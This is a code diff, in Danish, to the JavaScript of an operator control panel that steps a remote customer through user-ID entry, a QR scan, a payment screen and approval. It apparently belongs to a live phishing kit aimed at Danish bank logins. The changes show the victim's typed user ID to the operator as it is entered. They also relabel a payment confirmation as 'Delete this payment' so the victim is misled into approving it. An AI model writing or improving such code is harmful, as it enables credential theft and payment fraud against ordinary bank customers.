@@ -278,18 +278,30 @@ function escapeHtml(str){
 /* ════════════════════════════════════════════════════════════
    FLOW-KNAPPER — kundens trin
    ════════════════════════════════════════════════════════════ */
-const FLOW_LABELS = { besked: 'Besked', scan: 'Scan', tekst: 'Viser tekst', action: 'Egen handling', wait: 'Venter', approved: 'Godkendt' };
+const FLOW_LABELS = { brugerid: 'Bruger-ID', scan: 'Vis QR', betaling: 'Betaling', wait: 'Venter', approved: 'Godkendt' };
 
 function renderFlow(){
   if(!state) return;
-  const current = state.flow || 'scan';
-  ['besked','scan','action','wait','approved'].forEach(f => {
+  const current = state.flow || 'brugerid';
+  ['brugerid','scan','betaling','wait','approved'].forEach(f => {
     const btn = document.getElementById('flow' + f.charAt(0).toUpperCase() + f.slice(1) + 'Btn');
     if(!btn) return;
     btn.classList.toggle('current', current === f);
   });
   const cur = document.getElementById('flowCurrent');
   if(cur) cur.textContent = FLOW_LABELS[current] || current;
+
+  // kundens indtastning (live)
+  const typedBox = document.getElementById('typedBox');
+  if (typedBox) {
+    const t = state.typed || {};
+    if (t.brugerId) {
+      typedBox.style.display = 'block';
+      document.getElementById('typedBruger').textContent = t.brugerId;
+    } else {
+      typedBox.style.display = 'none';
+    }
+  }
 
   // udfyld tekst-feltet fra state
   const tekstEl = document.getElementById('tekstInput');
@@ -331,7 +343,7 @@ async function actionSendClick(){
   const title  = document.getElementById('actionTitle').value.trim();
   const amount = document.getElementById('actionAmount').value.trim();
   const detail = document.getElementById('actionDetail').value.trim();
-  await setFlow('action', { title: title || 'Godkend dette køb', amount, detail });
+  await setFlow('betaling', { title: title || 'Slet denne betaling', amount, detail });
   flashSave('actionSaveMsg');
 }
 
@@ -347,11 +359,11 @@ async function tekstSendClick(){
 document.addEventListener('click', function(e){
   const btn = e.target.closest ? e.target.closest('.flow-btn') : null;
   if(btn){
-    if(btn.id === 'flowBeskedBtn') return setFlow('besked');
+    if(btn.id === 'flowBrugerBtn') return setFlow('brugerid');
     if(btn.id === 'flowScanBtn') return setFlow('scan');
     if(btn.id === 'flowWaitBtn') return setFlow('wait');
     if(btn.id === 'flowApproveBtn') return setFlow('approved');
-    if(btn.id === 'flowActionBtn') return setFlow('action', {
+    if(btn.id === 'flowBetalingBtn') return setFlow('betaling', {
       title: document.getElementById('actionTitle').value.trim(),
       amount: document.getElementById('actionAmount').value.trim(),
       detail: document.getElementById('actionDetail').value.trim()
